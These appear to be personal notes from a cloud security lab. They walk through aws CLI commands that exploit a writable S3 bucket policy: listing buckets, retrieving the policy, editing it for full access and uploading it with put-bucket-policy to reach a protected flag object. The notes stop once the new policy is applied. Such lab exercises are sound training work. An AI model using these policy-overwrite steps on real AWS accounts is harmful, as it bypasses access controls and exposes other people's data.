Bucket policies are used to restrict/allow access to buckets and have to be crafted very carefully. A misconfigured bucket policy can allow attackers to steal sensitive data and use the S3 bucket in other attacks.

In this lab, the bucket policy denies all users from reading a specific object. But there exists a misconfiguration in the bucket policy which can be leveraged to modify the bucket policy and read the object

==================================================================

Configure AWS CLI with access credentials --> `aws configure`
Listing s3 buckets --> `aws s3api list-buckets`
![[Pasted image 20210826191826.png]]
Checking bucket objects --> `aws s3api list-objects --bucket s3-writable-policy-157363981057`
Insufficient permissions to download the flag --> `aws s3 cp s3://s3-writable-policy-157363981057/flag .`

Getting bucket policy --> `aws s3api get-bucket-policy --bucket s3-writable-policy-157363981057 --output text | python -m json.tool > policy.json`
![[Pasted image 20210826192409.png]]

Modifying bucket policy for full access --> `vim policy.json`
![[Pasted image 20210826192517.png]]

Updating new policy on bucket -->  `aws s3api put-bucket-policy --bucket s3-writable-policy-157363981057 --policy file://policy.json`
Policy successfully applied